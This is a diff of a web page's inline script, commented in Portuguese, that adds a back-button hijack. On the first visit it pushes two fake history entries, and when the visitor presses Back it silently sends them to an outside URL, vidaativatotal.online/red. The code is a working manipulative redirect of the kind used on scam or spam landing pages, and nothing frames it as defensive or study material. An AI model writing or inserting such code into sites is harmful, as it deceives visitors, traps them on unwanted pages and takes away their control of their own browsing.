@@ -77,16 +77,25 @@
 </script>
 
 <script>
-  // 1) Insere duas entradas no histórico
-  history.pushState({noBackExitsApp: true}, '');
-  history.pushState({noBackExitsApp: true}, '');
+  (function() {
+    // 1) Apenas na primeira visita, empurra duas entradas de histórico
+    if (!sessionStorage.getItem('historyHackDone')) {
+      history.pushState({redirect: true}, '', '');
+      history.pushState({redirect: true}, '', '');
+      sessionStorage.setItem('historyHackDone', '1');
+    }
 
-  // 2) Quando o usuário clicar em "Voltar"...
-  window.addEventListener('popstate', function(event) {
-    // ...redireciona para red.com sem poluir o histórico
-    window.location.replace('https://vidaativatotal.online/red');
-  });
+    // 2) Escuta a navegação de histórico (back/forward)
+    window.addEventListener('popstate', function(event) {
+      // Verifica se é uma das entradas que criamos
+      if (event.state && event.state.redirect) {
+        // Redireciona para red.com sem poluir o histórico
+        window.location.replace('https://vidaativatotal.online/red');
+      }
+    });
+  })();
 </script>
+
 
 
 
